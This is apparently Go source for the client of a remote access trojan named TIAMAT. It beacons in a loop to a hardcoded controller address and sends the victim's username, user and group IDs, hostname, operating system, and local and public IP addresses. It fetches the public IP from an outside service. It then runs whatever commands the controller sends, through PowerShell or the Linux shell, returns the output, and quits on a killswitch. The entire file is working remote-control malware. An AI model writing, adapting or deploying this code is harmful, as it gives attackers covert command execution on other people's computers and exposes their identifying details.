package main

import (
	"encoding/gob"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

var (
	RemoteIP            string        = "192.168.1.181"
	RemotePort          string        = "1302"
	Remote_IP_Requester string        = "https://ip.bulgariu.xyz"
	TimeoutRate         time.Duration = 5
)

func main() {
	log.SetPrefix("[TIAMAT-CLIENT] ")
	for {
		if err := start(); err != nil {
			log.Print(err)
		}
		time.Sleep(time.Second * TimeoutRate)
	}
}

func start() error {
	conn, err := net.Dial("tcp", RemoteIP+":"+RemotePort)
	if err != nil {
		e := fmt.Errorf("Error happened connecting to server: %v\n", err)
		return e
	}
	defer conn.Close()
	localIP := fmt.Sprint(conn.LocalAddr().(*net.TCPAddr).IP)
	if err := sendOSInfo(conn, localIP); err != nil {
		return err
	}
	for {
		if err := awaitInstructions(conn); err != nil {
			e := fmt.Errorf("Error happened awaiting instructions: %v\n", err)
			return e
		}
	}
}

func getIP() (string, error) {
	res, err := http.Get("https://ip.bulgariu.xyz")
	if err != nil {
		log.Printf("Error happened GETting IP: %v\n", err)
		return "", nil
	}
	resbody, err := io.ReadAll(res.Body)
	if err != nil {
		log.Printf("Error happened reading IP body: %v\n", err)
		return "", nil
	}
	ip := strings.TrimRight(string(resbody), "\n")
	return ip, nil
}

func sendOSInfo(conn net.Conn, localIP string) error {
	currentUser, err := user.Current()
	if err != nil {
		e := fmt.Errorf("Error happened getting user: %v\n", err)
		return e
	}

	clientHostname, err := os.Hostname()
	if err != nil {
		e := fmt.Errorf("Error happened getting hostname: %v\n", err)
		return e
	}

	ip, err := getIP()
	if err != nil {
		e := fmt.Errorf("Error happened pulling IP: %v\n", err)
		return e
	}

	newClient := Client{
		Username:        currentUser.Username,
		UID:             currentUser.Uid,
		GID:             currentUser.Gid,
		OperatingSystem: runtime.GOOS,
		Hostname:        clientHostname,
		PublicIP:        ip,
		LocalIP:         localIP,
	}

	enc := gob.NewEncoder(conn)
	err = enc.Encode(newClient)
	if err != nil {
		e := fmt.Errorf("Error happened sending OS info to server: %v\n", err)
		return e
	}

	return nil
}

func awaitInstructions(conn net.Conn) error {
	dec := gob.NewDecoder(conn)
	inst := Instructions{}
	err := dec.Decode(&inst)
	if err != nil {
		return err
	}

	switch {
	///////////////////////////////
	case inst.IsHeartbeat == true && inst.Message == "PING":
		if err := Heartbeat(conn); err != nil {
			return err
		}
		return nil
	///////////////////////////////
	case inst.IsCommand == true:
		executeCommand(conn, inst.Message)
	///////////////////////////////
	case inst.IsKillswitch == true:
		os.Exit(0)
	default:
		sendMessage(Response{Successful: false, Message: "Unknown order!"}, conn)
	}
	///////////////////////////////
	return nil
}

func Heartbeat(conn net.Conn) error {
	resp := Response{Successful: true, Message: "PONG"}
	err := sendMessage(resp, conn)
	if err != nil {
		return err
	}
	return nil
}

func executeCommand(conn net.Conn, command string) {
	var out []byte
	var err error

	formattedCommand := strings.Fields(command)
	switch runtime.GOOS {
	case "windows":
		t := []string{"-NoProfile"}
		t = append(t, formattedCommand...)
		out, err = exec.Command("powershell", t...).Output()
	case "linux":
		out, err = exec.Command(formattedCommand[0], formattedCommand[1:]...).Output()
	}
	if err != nil {
		errorMsg := fmt.Sprintf("%v\n", err)
		resp := Response{Successful: false, Message: errorMsg}
		sendMessage(resp, conn)
		return
	}
	resp := Response{
		Successful: true,
		Message:    string(out),
	}
	sendMessage(resp, conn)
}

func sendMessage(resp Response, conn net.Conn) error {
	enc := gob.NewEncoder(conn)
	err := enc.Encode(&resp)
	if err != nil {
		return err
	}
	return nil
}
